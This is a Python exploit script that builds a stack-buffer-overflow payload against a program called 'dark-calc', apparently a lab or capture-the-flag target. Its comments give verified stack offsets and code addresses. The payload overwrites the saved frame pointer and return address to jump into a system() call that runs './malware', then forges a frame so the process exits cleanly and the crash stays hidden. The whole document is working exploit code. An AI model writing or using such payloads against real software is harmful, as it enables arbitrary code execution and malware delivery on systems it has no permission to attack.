#!/usr/bin/env python3
"""Build a stack-overflow payload that transfers control to malware."""
import struct
import sys

# ---------------------------------------------------------------------------
# dark-calc facts (verified with objdump/readelf and by running the payload):
#   * input() keeps the expression at rbp-0x10 and returns via `leave; ret`,
#     so the saved return address is 0x18 bytes above the buffer;
#   * init_fixed_stack() mmap()s 0x721000000000 + 0x802000 RWX with PROT_NONE
#     guard pages at both ends, so expression[] always lands at
#     0x721000800fd0 and only 0x30 bytes remain before the upper guard page;
#   * input() strcpy()s the expression into command_buf (0x6030d0) before it
#     returns, so an expression starting with "./malware\0" leaves that exact
#     command string in command_buf;
#   * 0x401a6b is the tail of eval(): `mov edi, 0x6030d0; call system@plt`,
#     i.e. jumping there runs system("./malware") with a correctly aligned
#     stack;
#   * after system() returns, eval's epilogue is `leave; ret`, so the saved
#     rbp the overflow wrote decides where control continues.  Pointing it at
#     the saved-rip slot itself makes `leave` pop 0x401a6b into rbp and `ret`
#     use the next slot, which we set to __wrap_main.  __wrap_main resets rsp
#     to fixed_stack_top and calls main() again; the second input() sees EOF,
#     prints the answer and calls exit(0), so the process terminates cleanly.
# ---------------------------------------------------------------------------
system_call_site = 0x401A6B   # mov edi,command_buf; call system@plt (eval+0x94)
wrap_main = 0x401C0E          # restores rsp to fixed_stack_top, calls main()
fake_frame = 0x721000800FE8   # &saved rip slot: [X] = 0x401a6b, [X+8] = wrap_main

payload = b"./malware\x00"            # becomes command_buf via strcpy()
payload += b"A" * (0x10 - len(payload))   # pad the 16-byte expression[]
payload += struct.pack("<Q", fake_frame)        # saved rbp  -> forged frame
payload += struct.pack("<Q", system_call_site)  # saved rip  -> system()
payload += struct.pack("<Q", wrap_main)         # [fake_frame + 8]

assert len(payload) == 0x28 and len(payload) + 1 <= 0x30
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
